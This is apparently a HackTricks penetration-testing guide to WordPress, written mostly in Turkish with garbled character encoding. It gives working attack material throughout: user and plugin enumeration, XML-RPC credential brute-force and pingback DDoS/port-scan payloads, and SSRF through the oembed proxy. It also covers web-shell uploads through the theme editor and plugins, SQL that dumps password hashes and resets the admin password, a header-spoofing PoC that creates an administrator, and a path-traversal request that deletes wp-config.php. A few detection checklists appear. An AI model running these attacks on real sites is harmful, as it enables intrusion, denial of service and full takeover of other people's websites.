# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

- **YÃ¼klenen** dosyalar gider: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Tema dosyalarÄ± /wp-content/themes/ iÃ§inde bulunur,** bu yÃ¼zden temanÄ±n bazÄ± php dosyalarÄ±nÄ± deÄŸiÅŸtirip RCE elde etmeye Ã§alÄ±ÅŸÄ±rsanÄ±z muhtemelen bu yolu kullanÄ±rsÄ±nÄ±z. Ã–rneÄŸin: **theme twentytwelve** kullanÄ±larak **404.php** dosyasÄ±na ÅŸu adreste eriÅŸilebilir: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **BaÅŸka faydalÄ± bir URL ÅŸunu olabilir:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **wp-config.php** iÃ§inde veritabanÄ±nÄ±n root parolasÄ±nÄ± bulabilirsiniz.
- Kontrol edilecek varsayÄ±lan giriÅŸ yollarÄ±: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Ana WordPress DosyalarÄ±**

- `index.php`
- `license.txt` yÃ¼klenen WordPress sÃ¼rÃ¼mÃ¼ gibi faydalÄ± bilgiler iÃ§erir.
- `wp-activate.php` yeni bir WordPress sitesi kurarken e-posta aktivasyon sÃ¼reci iÃ§in kullanÄ±lÄ±r.
- GiriÅŸ klasÃ¶rleri (gizlemek iÃ§in yeniden adlandÄ±rÄ±lmÄ±ÅŸ olabilir):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` HTTP taÅŸÄ±ma mekanizmasÄ± ve XML kodlama mekanizmasÄ± ile veri iletimine olanak saÄŸlayan bir WordPress Ã¶zelliÄŸini temsil eden bir dosyadÄ±r. Bu tÃ¼r iletiÅŸim, WordPress [REST API](https://developer.wordpress.org/rest-api/reference) ile deÄŸiÅŸtirildi.
- `wp-content` klasÃ¶rÃ¼ eklentilerin ve temalarÄ±n saklandÄ±ÄŸÄ± ana dizindir.
- `wp-content/uploads/` platforma yÃ¼klenen tÃ¼m dosyalarÄ±n saklandÄ±ÄŸÄ± dizindir.
- `wp-includes/` sertifikalar, yazÄ± tipleri, JavaScript dosyalarÄ± ve widget'lar gibi Ã§ekirdek dosyalarÄ±n saklandÄ±ÄŸÄ± dizindir.
- `wp-sitemap.xml` Wordpress 5.5 ve sonraki sÃ¼rÃ¼mlerde, tÃ¼m genel gÃ¶nderileri ve herkese aÃ§Ä±k sorgulanabilir gÃ¶nderi tÃ¼rleri ile taksonomileri iÃ§eren bir sitemap XML dosyasÄ± Ã¼retir.

**Post exploitation**

- `wp-config.php` dosyasÄ± WordPress'in veritabanÄ±na baÄŸlanmak iÃ§in ihtiyaÃ§ duyduÄŸu veritabanÄ± adÄ±, veritabanÄ± hostu, kullanÄ±cÄ± adÄ± ve parola, authentication keys and salts ve veritabanÄ± tablo Ã¶n eki gibi bilgileri iÃ§erir. Bu yapÄ±landÄ±rma dosyasÄ± aynÄ± zamanda DEBUG modunu etkinleÅŸtirmek iÃ§in de kullanÄ±labilir; bu, sorun giderme sÄ±rasÄ±nda faydalÄ± olabilir.

### KullanÄ±cÄ± Ä°zinleri

- **Administrator**
- **Editor**: Kendi ve baÅŸkalarÄ±nÄ±n gÃ¶nderilerini yayÄ±nlar ve yÃ¶netir
- **Author**: Kendi gÃ¶nderilerini yayÄ±nlar ve yÃ¶netir
- **Contributor**: GÃ¶nderilerini yazar ve yÃ¶netir ancak yayÄ±nlayamaz
- **Subscriber**: GÃ¶nderileri gÃ¶rÃ¼ntÃ¼ler ve profilini dÃ¼zenler

## **Passive Enumeration**

### **WordPress sÃ¼rÃ¼mÃ¼nÃ¼ Ã¶ÄŸrenme**

`/license.txt` veya `/readme.html` dosyalarÄ±nÄ± bulup bulamayacaÄŸÄ±nÄ±zÄ± kontrol edin

SayfanÄ±n **kaynak kodu** iÃ§inde (Ã¶rnek: [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link dosyalarÄ±

![](<../../images/image (533).png>)

- JavaScript dosyalarÄ±

![](<../../images/image (524).png>)

### Eklentileri Edinin
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### TemalarÄ± Al
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Genel olarak sÃ¼rÃ¼m bilgilerini Ã§Ä±karma
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktif keÅŸif

### Plugins and Themes

Muhtemelen tÃ¼m Plugins and Themes'i bulamayacaksÄ±nÄ±z. Hepsini keÅŸfetmek iÃ§in **actively Brute Force a list of Plugins and Themes** yapmanÄ±z gerekecek (umarÄ±z bizim iÃ§in bu listeleri iÃ§eren otomatik araÃ§lar vardÄ±r).

### KullanÄ±cÄ±lar

- **ID Brute:** Bir WordPress sitesinden geÃ§erli kullanÄ±cÄ±larÄ± kullanÄ±cÄ± ID'lerini Brute Forcing yaparak elde edersiniz:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
YanÄ±tlar **200** veya **30X** ise, bu id'nin **geÃ§erli** olduÄŸu anlamÄ±na gelir. YanÄ±t **400** ise, id **geÃ§ersizdir**.

- **wp-json:** KullanÄ±cÄ±lar hakkÄ±nda bilgi almak iÃ§in ayrÄ±ca ÅŸu sorguyu deneyebilirsiniz:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
KullanÄ±cÄ±lar hakkÄ±nda bazÄ± bilgiler ortaya Ã§Ä±karabilecek bir diÄŸer `/wp-json/` endpoint ÅŸudur:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **YalnÄ±zca bu Ã¶zelliÄŸi etkinleÅŸtirmiÅŸ kullanÄ±cÄ±lar hakkÄ±nda bilgi saÄŸlanacaktÄ±r**.

AyrÄ±ca unutmayÄ±n ki **/wp-json/wp/v2/pages** IP adreslerini leak edebilir.

- **Login username enumeration**: **`/wp-login.php`** Ã¼zerinden giriÅŸ yapÄ±lÄ±rken gÃ¶sterilen **mesaj** kullanÄ±cÄ± adÄ±nÄ±n var olup olmadÄ±ÄŸÄ±na gÃ¶re **farklÄ±dÄ±r**.

### XML-RPC

EÄŸer `xml-rpc.php` aktifse credentials brute-force gerÃ§ekleÅŸtirebilir veya bunu diÄŸer kaynaklara DoS saldÄ±rÄ±larÄ± baÅŸlatmak iÃ§in kullanabilirsiniz. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

Aktif olup olmadÄ±ÄŸÄ±nÄ± gÃ¶rmek iÃ§in _**/xmlrpc.php**_ adresine eriÅŸmeyi deneyin ve ÅŸu isteÄŸi gÃ¶nderin:

**Kontrol**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** veya **`metaWeblog.getUsersBlogs`**, credentials'Ä± brute-force etmek iÃ§in kullanÄ±labilecek yÃ¶ntemlerden bazÄ±larÄ±dÄ±r. EÄŸer bunlardan herhangi birini bulursanÄ±z ÅŸu ÅŸekilde bir istek gÃ¶nderebilirsiniz:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Kimlik bilgileri geÃ§ersizse 200 kodlu bir yanÄ±tta _"Incorrect username or password"_ mesajÄ± gÃ¶rÃ¼nmelidir.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

DoÄŸru kimlik bilgilerini kullanarak bir dosya yÃ¼kleyebilirsiniz. YanÄ±tta yol gÃ¶rÃ¼necektir ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
AyrÄ±ca aynÄ± istekte birden fazla kimlik bilgisi deneyebildiÄŸiniz iÃ§in **`system.multicall`** kullanarak kimlik bilgilerini brute-force etmek iÃ§in **daha hÄ±zlÄ± bir yol** vardÄ±r:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Bu yÃ¶ntem programlar iÃ§indir, insanlar iÃ§in deÄŸil; ayrÄ±ca eski olduÄŸu iÃ§in 2FA'yi desteklemez. Yani geÃ§erli kimlik bilgilerine sahipseniz ama ana giriÅŸ 2FA ile korunuyorsa, **xmlrpc.php'yi kÃ¶tÃ¼ye kullanarak bu kimlik bilgileriyle 2FA'yÄ± atlayarak giriÅŸ yapmanÄ±z mÃ¼mkÃ¼n olabilir**. Konsol Ã¼zerinden yapabildiÄŸiniz tÃ¼m iÅŸlemleri gerÃ§ekleÅŸtiremeyebilirsiniz, fakat Ippsec'in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) videosunda aÃ§Ä±kladÄ±ÄŸÄ± gibi yine de RCE'ye ulaÅŸmanÄ±z mÃ¼mkÃ¼n olabilir.

**DDoS or port scanning**

EÄŸer listede _**pingback.ping**_ metodunu bulabilirseniz, Wordpress'in herhangi bir host/port'a rastgele bir istek gÃ¶ndermesini saÄŸlayabilirsiniz.\
Bu, binlerce **Wordpress** sitesinin tek bir hedefe eriÅŸmesini saÄŸlamak iÃ§in kullanÄ±labilir (bÃ¶ylece o hedefte bir **DDoS** oluÅŸur) veya bunu **Wordpress**'in bazÄ± iÃ§ aÄŸlarÄ± taramasÄ± iÃ§in kullanabilirsiniz (herhangi bir port belirtebilirsiniz).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

EÄŸer **faultCode** deÄŸeri **0**'dan (17) **bÃ¼yÃ¼k**se, bu portun aÃ§Ä±k olduÄŸu anlamÄ±na gelir.

Ã–nceki bÃ¶lÃ¼mdeki **`system.multicall`** kullanÄ±mÄ±na bakÄ±n; bu yÃ¶ntemi DDoS oluÅŸturmak iÃ§in nasÄ±l kÃ¶tÃ¼ye kullanacaÄŸÄ±nÄ±zÄ± Ã¶ÄŸrenin.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Bu dosya genellikle Wordpress sitesinin kÃ¶kÃ¼nde bulunur: **`/wp-cron.php`**\
Bu dosyaya **eriÅŸildiÄŸinde** "**yoÄŸun**" MySQL **sorgusu** Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r, bu yÃ¼zden **saldÄ±rganlar** tarafÄ±ndan bir **DoS** oluÅŸturmak iÃ§in kullanÄ±labilir.\
AyrÄ±ca, varsayÄ±lan olarak `wp-cron.php` her sayfa yÃ¼klemesinde (bir istemci herhangi bir Wordpress sayfasÄ±nÄ± istediÄŸinde) Ã§aÄŸrÄ±lÄ±r; bu da yÃ¼ksek trafiÄŸe sahip sitelerde sorunlara (DoS) yol aÃ§abilir.

Wp-Cron'u devre dÄ±ÅŸÄ± bÄ±rakÄ±p, gerekli iÅŸlemleri dÃ¼zenli aralÄ±klarla gerÃ§ekleÅŸtirecek gerÃ§ek bir cronjob'un host iÃ§inde oluÅŸturulmasÄ± Ã¶nerilir (sorun oluÅŸturmayacak ÅŸekilde).

### /wp-json/oembed/1.0/proxy - SSRF

Try to access _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ and the Worpress site may make a request to you.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Bu araÃ§ **methodName: pingback.ping** ve yol **/wp-json/oembed/1.0/proxy** olup olmadÄ±ÄŸÄ±nÄ± kontrol eder ve mevcutsa bunlarÄ± istismar etmeye Ã§alÄ±ÅŸÄ±r.

## Otomatik AraÃ§lar
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Bir biti Ã¼zerine yazarak eriÅŸim saÄŸlama

GerÃ§ek bir saldÄ±rÄ±dan Ã§ok merak amaÃ§lÄ± bir ÅŸeydir. CTF'de [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) herhangi bir wordpress dosyasÄ±ndaki 1 biti Ã§evirebiliyordunuz. BÃ¶ylece ` /var/www/html/wp-includes/user.php` dosyasÄ±nÄ±n `5389` konumundaki biti Ã§evirerek NOT (`!`) operasyonunu NOP yapabilirdiniz.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**KullanÄ±lan temadaki bir php dosyasÄ±nÄ± deÄŸiÅŸtirme (admin kimlik bilgileri gerekli)**

Appearance â†’ Theme Editor â†’ 404 Template (saÄŸda)

Ä°Ã§eriÄŸi bir php shell iÃ§in deÄŸiÅŸtirin:

![](<../../images/image (384).png>)

GÃ¼ncellenen sayfaya nasÄ±l eriÅŸileceÄŸini internette araÅŸtÄ±rÄ±n. Bu durumda buraya eriÅŸmelisiniz: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Åunu kullanabilirsiniz:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
oturum elde etmek iÃ§in.

## Plugin RCE

### PHP plugin

Bir plugin olarak .php dosyalarÄ± yÃ¼klemek mÃ¼mkÃ¼n olabilir.\
Ã–rneÄŸin ÅŸu ÅŸekilde bir php backdoor oluÅŸturun:

![](<../../images/image (183).png>)

Sonra yeni bir plugin ekleyin:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

Muhtemelen gÃ¶rÃ¼nÃ¼rde bir ÅŸey yapmayacaktÄ±r, ancak Media'ya giderseniz shell'inizin yÃ¼klendiÄŸini gÃ¶receksiniz:

![](<../../images/image (462).png>)

EriÅŸin ve reverse shell'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in URL'i gÃ¶receksiniz:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Bu yÃ¶ntem, zafiyeti bilinen ve web shell elde etmek iÃ§in sÃ¶mÃ¼rÃ¼lebilen kÃ¶tÃ¼ amaÃ§lÄ± bir plugin'in kurulmasÄ±nÄ± iÃ§erir. Bu iÅŸlem WordPress dashboard Ã¼zerinden ÅŸu ÅŸekilde gerÃ§ekleÅŸtirilir:

1. **Plugin Acquisition**: Plugin, Exploit DB gibi bir kaynaktan ÅŸu Ã¶rnekteki gibi elde edilir: [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- WordPress dashboard'a gidin, sonra `Dashboard > Plugins > Upload Plugin` yolunu izleyin.
- Ä°ndirilen plugin'in zip dosyasÄ±nÄ± yÃ¼kleyin.
3. **Plugin Activation**: Plugin baÅŸarÄ±lÄ± ÅŸekilde yÃ¼klendikten sonra dashboard Ã¼zerinden etkinleÅŸtirilmelidir.
4. **Exploitation**:
- "reflex-gallery" plugin'i yÃ¼klendiÄŸinde ve etkinleÅŸtirildiÄŸinde, zafiyeti bilindiÄŸi iÃ§in sÃ¶mÃ¼rÃ¼lebilir.
- Metasploit framework bu zafiyet iÃ§in bir exploit saÄŸlar. Uygun modÃ¼lÃ¼ yÃ¼kleyip belirli komutlarÄ± Ã§alÄ±ÅŸtÄ±rarak bir meterpreter oturumu baÅŸlatÄ±labilir ve siteye yetkisiz eriÅŸim saÄŸlanabilir.
- Bunun, bir WordPress sitesini sÃ¶mÃ¼rmek iÃ§in kullanÄ±lan birÃ§ok yÃ¶ntemden sadece biri olduÄŸu belirtilmelidir.

Ä°Ã§erik, plugin'i yÃ¼kleme ve etkinleÅŸtirme adÄ±mlarÄ±nÄ± gÃ¶steren WordPress dashboard'undaki gÃ¶rsel yardÄ±mcÄ±lar iÃ§erir. Ancak, bu tÃ¼r zafiyetleri yetkisiz olarak sÃ¶mÃ¼rmenin yasalara aykÄ±rÄ± ve etik olmadÄ±ÄŸÄ±nÄ± belirtmek Ã¶nemlidir. Bu bilgiler sorumlu bir ÅŸekilde ve yalnÄ±zca aÃ§Ä±k izinle gerÃ§ekleÅŸtirilen penetration testing gibi yasal baÄŸlamlarda kullanÄ±lmalÄ±dÄ±r.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). It provides **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ WordPress'te bir kullanÄ±cÄ± oluÅŸturur.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Ã–zel plugin'inizi (backdoor) WordPress'e yÃ¼kleyin.
- _**(RCE) Built-In Plugin Edit:**_ WordPress'teki varsayÄ±lan plugin'leri dÃ¼zenleyin.
- _**(RCE) Built-In Theme Edit:**_ WordPress'teki varsayÄ±lan theme'leri dÃ¼zenleyin.
- _**(Custom) Custom Exploits:**_ ÃœÃ§Ã¼ncÃ¼ taraf WordPress plugin/theme'leri iÃ§in Ã¶zel Exploit'ler.

## Post Exploitation

KullanÄ±cÄ± adlarÄ±nÄ± ve ÅŸifreleri Ã§Ä±kartÄ±n:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
admin parolasÄ±nÄ± deÄŸiÅŸtir:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

Bir Wordpress eklentisinin iÅŸlevselliÄŸi nasÄ±l aÃ§Ä±ÄŸa Ã§Ä±kardÄ±ÄŸÄ±nÄ± bilmek, eklentinin iÅŸlevselliÄŸindeki gÃ¼venlik aÃ§Ä±klarÄ±nÄ± bulmak iÃ§in anahtardÄ±r. Bir eklentinin nasÄ±l iÅŸlevsellik aÃ§abileceÄŸini aÅŸaÄŸÄ±daki madde iÅŸaretlerinde gÃ¶rebilir ve bazÄ± savunmasÄ±z eklenti Ã¶rneklerini [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) adresinde bulabilirsiniz.

- **`wp_ajax`**

Bir eklentinin fonksiyonlarÄ±nÄ± kullanÄ±cÄ±lara aÃ§masÄ±nÄ±n yollarÄ±ndan biri AJAX handlers aracÄ±lÄ±ÄŸÄ±dÄ±r. Bu handler'lar mantÄ±k, authorization veya authentication hatalarÄ± iÃ§erebilir. AyrÄ±ca, bu fonksiyonlarÄ±n hem authentication hem de authorization'Ä± WordPress nonce'unun varlÄ±ÄŸÄ±na dayandÄ±rmasÄ± sÄ±k gÃ¶rÃ¼len bir durumdur; bu nonce'a **Wordpress instance'Ä±nda kimlik doÄŸrulamasÄ± yapÄ±lmÄ±ÅŸ herhangi bir kullanÄ±cÄ± sahip olabilir** (rolÃ¼nden baÄŸÄ±msÄ±z olarak).

Bir eklentide bir fonksiyonu aÃ§Ä±ÄŸa Ã§Ä±karmak iÃ§in kullanÄ±labilecek fonksiyonlar ÅŸunlardÄ±r:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` kullanÄ±mÄ± endpoint'i herhangi bir kullanÄ±cÄ± tarafÄ±ndan (kimliÄŸi doÄŸrulanmamÄ±ÅŸ olanlar dahil) eriÅŸilebilir kÄ±lar.**

> [!CAUTION]
> AyrÄ±ca, eÄŸer fonksiyon sadece `wp_verify_nonce` fonksiyonu ile kullanÄ±cÄ±nÄ±n yetkilendirmesini kontrol ediyorsa, bu fonksiyon genellikle sadece kullanÄ±cÄ±nÄ±n giriÅŸ yapÄ±p yapmadÄ±ÄŸÄ±nÄ± kontrol eder; genellikle kullanÄ±cÄ±nÄ±n rolÃ¼nÃ¼ kontrol etmez. Bu yÃ¼zden dÃ¼ÅŸÃ¼k ayrÄ±calÄ±klÄ± kullanÄ±cÄ±lar yÃ¼ksek ayrÄ±calÄ±klÄ± iÅŸlemlere eriÅŸebilir.

- **REST API**

AyrÄ±ca, `register_rest_route` fonksiyonunu kullanarak wordpress'ten fonksiyonlarÄ± rest AP kaydederek aÃ§Ä±ÄŸa Ã§Ä±karmak da mÃ¼mkÃ¼ndÃ¼r:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
`permission_callback` bir API metodunu Ã§aÄŸÄ±rmaya yetkili olup olmadÄ±ÄŸÄ±nÄ± kontrol eden bir geri Ã§aÄŸÄ±rma fonksiyonudur.

**EÄŸer dahili `__return_true` fonksiyonu kullanÄ±lÄ±rsa, kullanÄ±cÄ± izin kontrollerini tamamen atlayacaktÄ±r.**

- **DoÄŸrudan php dosyasÄ±na eriÅŸim**

Elbette Wordpress PHP kullanÄ±r ve eklenti iÃ§indeki dosyalar web Ã¼zerinden doÄŸrudan eriÅŸilebilir. Bu yÃ¼zden bir eklenti, yalnÄ±zca dosyaya eriÅŸilmesiyle tetiklenen herhangi bir gÃ¼venlik aÃ§Ä±ÄŸÄ± iÃ§eren iÅŸlevsellik sunuyorsa, bu herhangi bir kullanÄ±cÄ± tarafÄ±ndan istismar edilebilir.

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

BazÄ± eklentiler dahili entegrasyonlar veya reverse proxies iÃ§in â€œtrusted headerâ€ kÄ±sayollarÄ± uygular ve daha sonra bu header'Ä± REST istekleri iÃ§in mevcut kullanÄ±cÄ± baÄŸlamÄ±nÄ± ayarlamak amacÄ±yla kullanÄ±r. EÄŸer header, upstream bir bileÅŸen tarafÄ±ndan isteÄŸe kriptografik olarak baÄŸlanmamÄ±ÅŸsa, bir saldÄ±rgan bunu sahteleyebilir ve yÃ¶netici olarak ayrÄ±calÄ±klÄ± REST rotalarÄ±na eriÅŸebilir.

- Etkisi: core users REST route Ã¼zerinden yeni bir yÃ¶netici oluÅŸturarak kimlik doÄŸrulama olmadan yÃ¶netici ayrÄ±calÄ±klarÄ±na yÃ¼kselme.
- Ã–rnek header: `X-Wcpay-Platform-Checkout-User: 1` (kullanÄ±cÄ± ID'sini 1 olarak zorlar; genellikle ilk yÃ¶netici hesabÄ±dÄ±r.)
- Ä°stismar edilen rota: `POST /wp-json/wp/v2/users` yÃ¼kseltilmiÅŸ bir rol dizisi ile.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works

- The plugin maps a client-controlled header to authentication state and skips capability checks.
- WordPress core expects `create_users` capability for this route; the plugin hack bypasses it by directly setting the current user context from the header.

Expected success indicators

- HTTP 201 with a JSON body describing the created user.
- A new admin user visible in `wp-admin/users.php`.

Detection checklist

- Grep for `getallheaders()`, `$_SERVER['HTTP_...']`, or vendor SDKs that read custom headers to set user context (e.g., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Review REST registrations for privileged callbacks that lack robust `permission_callback` checks and instead rely on request headers.
- Look for usages of core user-management functions (`wp_insert_user`, `wp_create_user`) inside REST handlers that are gated only by header values.

### YetkilendirilmemiÅŸ Rastgele Dosya Silme via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress temalarÄ± ve eklentileri sÄ±klÄ±kla `wp_ajax_` ve `wp_ajax_nopriv_` hook'larÄ± aracÄ±lÄ±ÄŸÄ±yla AJAX handler'larÄ± aÃ§Ä±ÄŸa Ã§Ä±karÄ±r.  **_nopriv_** varyantÄ± kullanÄ±ldÄ±ÄŸÄ±nda **geri Ã§aÄŸrÄ± yetkilendirilmemiÅŸ ziyaretÃ§iler tarafÄ±ndan eriÅŸilebilir hale gelir**, bu yÃ¼zden herhangi bir hassas iÅŸlem ek olarak ÅŸunlarÄ± uygulamalÄ±dÄ±r:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Bu kod parÃ§asÄ±nÄ±n ortaya Ã§Ä±kardÄ±ÄŸÄ± sorunlar:

* **Kimlik doÄŸrulamasÄ±z eriÅŸim** â€“ `wp_ajax_nopriv_` hook kayÄ±tlÄ±.
* **No nonce / capability check** â€“ herhangi bir ziyaretÃ§i endpoint'e istek gÃ¶nderebilir.
* **No path sanitisation** â€“ kullanÄ±cÄ± kontrollÃ¼ `fontfamily` string'i filtrelenmeden bir dosya sistemi yoluna ekleniyor, bu da klasik `../../` traversal'a izin veriyor.

#### Ä°stismar

Bir saldÄ±rgan tek bir HTTP POST isteÄŸi gÃ¶ndererek **uploads temel dizininin altÄ±ndaki** (normalde `<wp-root>/wp-content/uploads/`) herhangi bir dosyayÄ± veya dizini silebilir:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Ã‡Ã¼nkÃ¼ `wp-config.php` *uploads*'un dÄ±ÅŸÄ±nda bulunduÄŸundan, varsayÄ±lan kurulumda dÃ¶rt `../` dizisi yeterlidir. `wp-config.php` dosyasÄ±nÄ± silmek, WordPress'i bir sonraki ziyarette *kurulum sihirbazÄ±*'na sokar ve tam site ele geÃ§irmeye olanak saÄŸlar (saldÄ±rgan sadece yeni bir DB yapÄ±landÄ±rmasÄ± saÄŸlar ve bir admin kullanÄ±cÄ± oluÅŸturur).

DiÄŸer etkili hedefler plugin/theme `.php` dosyalarÄ± (gÃ¼venlik eklentilerini kÄ±rmak iÃ§in) veya `.htaccess` kurallarÄ±dÄ±r.

#### Tespit kontrol listesi

* Dosya sistemi yardÄ±mcÄ±larÄ±nÄ± (`copy()`, `unlink()`, `$wp_filesystem->delete()` vb.) Ã§aÄŸÄ±ran herhangi bir `add_action( 'wp_ajax_nopriv_...')` callback'i.
* Path'lere temizlenmemiÅŸ kullanÄ±cÄ± girdisinin eklenmesi (bak: `$_POST`, `$_GET`, `$_REQUEST`).
